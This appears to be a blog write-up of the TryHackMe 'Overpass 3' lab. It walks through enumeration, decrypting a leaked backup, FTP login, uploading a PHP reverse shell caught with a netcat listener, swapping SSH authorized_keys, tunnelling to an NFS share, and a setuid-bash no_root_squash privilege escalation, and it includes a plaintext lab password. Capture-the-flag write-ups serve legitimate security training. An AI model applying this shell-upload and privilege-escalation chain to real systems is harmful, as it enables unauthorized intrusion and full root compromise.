---
layout: default
title : Overpass 3 - Web Hosting - THM
---

![Screenshot_20220324_031714](https://user-images.githubusercontent.com/24994796/160209915-2f41711f-71af-4a91-9eae-60237a89aeef.png)

# Less chatting more hacking 🤤
Let's jump right into it 

Here we are working with couple of broke programmers who built a web hosting ......

Upon firing up the machine we get an ip machine

First thing for every good security operative in enumeration
so we run an nmap scan to know which ports/services are up and running

![Screenshot_20220326_003154](https://user-images.githubusercontent.com/24994796/160210613-a77cc466-9717-4ee1-bb5e-11ba76dfcfa2.png)
After the scan we notice 3 ports opened and a bunch of vulnerebilities 
- Port 21,22 and 80 
- FTP,SSH and HTTP respecfully
- also notice on line 27,28 we already ran an http-enum and found two directories 
- lets keep those in mind for next time
Let's head on to our browser, load the website 
![Screenshot_20220326_003036](https://user-images.githubusercontent.com/24994796/160211351-b5006e30-7eb5-4b49-a362-f174c3c8d1ac.png)
We see the index page doesn't really give us much but we can clearly see staffs and their roles
Nothing major there except from an about page and Downloads
So heading on to the /backups directory we got from our scan we notice see a backup zip file 
We download it, extract it and were greeted with two files a gpg and a private pgp key file
![Screenshot_20220326_001459](https://user-images.githubusercontent.com/24994796/160211822-12de9c93-f934-4b7e-9486-c78fed62d191.png)
I guess we'll be learning a bit about pgp and gpg xD 
# Proceed to both this links if you want to learn about how to import keys and change a pgp passphrase

https://makandracards.com/makandra-orga/37763-gpg-extract-private-key-and-import-on-different-machine
https://blog.chapagain.com.np/gpg-how-to-change-edit-private-key-passphrase/


First change direcetory to one the contains your backup extracted files 
make sure you have gpg installed on yyour machine 
then we get into it
In your terminal type this 
- sudo apt-get install gpg 
- gpg --list-keys 
notice nothing is returned
- gpg --list-secret-keys 
Now let's proceed to importing the keys 
- gpg --import private.key
- run the gpg --list-secret-keys 
Notice we finally get some keys

![Screenshot_20220326_004741](https://user-images.githubusercontent.com/24994796/160212412-a94c2a7a-c8ed-46e9-9847-06a1c7356563.png)

Now changing its passphase
- gpg --edit-key your-key-ID
Your Key will be in hexadecimals 
- gpg> passwd
You'll be asked to input your new password twice 
Let's just type overpass
- gpg> save
Save it

# Decrypting the gpg file
In order to decrypt an encrypted file on Linux, you have to use the “gpg” command with the “-d” option for “decrypt” and specify the “. gpg” file that you want to decrypt.
Again, you will be probably be prompted with a window (or directly in the terminal) for the passphrase.
- gpg -d CustomerDetails.xlsx.gpg 
- input your passphrase
Now head back to the foleder that contains the backup files, you'll notice a new file, open it

![Screenshot_20220326_011324](https://user-images.githubusercontent.com/24994796/160213471-14e62faf-ce34-4e36-8212-d6af23650147.png)

![Screenshot_20220326_011913](https://user-images.githubusercontent.com/24994796/160213859-44e83b4d-70ce-4198-983d-2a7b79a8ddd0.png)


We have login credentials where to use it ?
Remember in our scan we had FTP&SSH being open 
Upon trying the SSH with all login details we didn't have any successfull ssh login
Let's try the FTP
make sure you have ftp installed on your pc 
- sudo apt-get install ftp
- ftp "machine IP"
- it prompts us to give a user 
- and a password
Just have fun trying all the users and passwords 

After logging in, we run ls to list directories
we see the backups directory and some other things 
It seems that's web directory
lets upload our web rev shell (/usr/share/webshells/php/php-reverse-shell.php) or any php of your choice
change the ip and port to port of our preferance and IP to our attacker machine's

![Screenshot_20220324_152536](https://user-images.githubusercontent.com/24994796/160214017-3d0abbd9-e0c1-48de-9286-2286a46c8ead.png)

Set up your listner 
- rlwrap nc -lvnp PORT
Head to the website and chane the directory to IP/webshell name 

![Screenshot_20220324_153103](https://user-images.githubusercontent.com/24994796/160214407-451de196-ff68-48cd-b2e9-161638230135.png)

We should caught a shell 


So yes from ![Screenshot_20220324_152557(2)](https://user-images.githubusercontent.com/24994796/160214836-b0e9a821-ee1b-473b-a718-1b56a9230376.png)

That's our initial shell, 
make the shell a stable one (* that'll be your little task, use bash to stabilize the shell, but rlwrap is a pretty stable shell)
from THM hint the webflag is in the apache user path
- cat /etc/passwd
![Screenshot_20220324_220936](https://user-images.githubusercontent.com/24994796/160214960-fb08e394-53c0-4c01-bb7e-9a99f9b0be17.png)
- cd /usr/share/httpd (apache path)
- ls
- cat your web flag

we have a user paradox who we have his password so let's head to his path
- su paradox
- ShibesAreGreat123 (password)

so let's try getting the user flag now, Paradox lacks the right to

run linpeas.sh or you can go through a series of manual exploitation

pay attention to NFS 
we check /etc/exports 
and see that the user james has a share to his path and it has the root_no_squat option
on our pc try mounting this share 
- showmount -e "MACHINE IP"
- we noticed some sort of Firewall is blocking our share 
- so let's try ssh port forwarding nfs share trick

but before we do that let's get a user we can successfully ssh to

we noticed we couldn't ssh to paradox even tho we had his password 
lets try replacing his authorized_keys with ours 
- first get your ssh key open another terminal tab
- cd ~/.ssh 
- ls 
- cat id_rsa.pub
now we have that let's go back to our shell tab and change paradox authourized keys
![Screenshot_20220324_152701(2)](https://user-images.githubusercontent.com/24994796/160216007-e0214d80-1374-4124-a0db-38c6696efd65.png)

- after that head back to your tab 
- time for the port forwarding trick, the link below explains it quite well, you can head there later 
https://gist.github.com/proudlygeek/5721498 
We run the following
Setup ssh tunnel
- ssh -fNv -L 3049:localhost:2049 paradox@MACHINE-IP 
![Screenshot_20220324_152739](https://user-images.githubusercontent.com/24994796/160216153-57f72cd7-65f9-4a85-9447-21419fe73dbe.png)
Mount the share
- mount -t nfs -o port=3049 localhost:/ /tmp/nfs
![Screenshot_20220324_152808](https://user-images.githubusercontent.com/24994796/160216187-043eef85-12fd-4457-bef4-2f19c26820fb.png)

so yh cd to the folder me mounted it to /tmp/nfs
- ls -la 
lists all files and folders
notice there's a .ssh folder, cd to it and cat the id_rsa.pub file 
so just ssh with it since we don't know the login
- ssh -i id_rsa.pub james@MACHINE-IP
![Screenshot_20220324_152851](https://user-images.githubusercontent.com/24994796/160216662-34572d73-5dae-457d-882a-8585bd8504ec.png)

![Screenshot_20220324_152959](https://user-images.githubusercontent.com/24994796/160216688-8e90ffe7-a381-48f0-802d-28b6a96e6bcb.png)
WE'RE IN 😎
cat out the user flag 

Now time for the privilege escalation path
pay good attention to this, things get tricky here
actually we use hacktricks trick xD
https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe

Head back to our /tmp/nfs folder 
- cd /tmp/nfs
- cp /bin/bash . (note my personal experience was tht after a minute the Terminal was a hung there so i closed it and opend another and went back the /tmp/nfs folder again, listing files a bash file was there)
- chmod +s bash

Now head back to the james's ssh and the shared folder path

./bash -p 

gives drops us a root shell
![Screenshot_20220324_153023](https://user-images.githubusercontent.com/24994796/160217074-d1353f2d-cc78-473b-a756-6d065749cc9b.png)

and BOOM root access 🥸 🤯

so the last task of finding root flag is up to you
nah just kidding 
- cat /root/root.flag
and we should get our root flag

That's it for Overpass 3

Hit me up on Twitter (https://twitter.com/abdulmalik_ttg) if you run into any issues 
Greetings from [SonOfABot]



<br> <br>
[Back To Home](../../index.md)
<br>








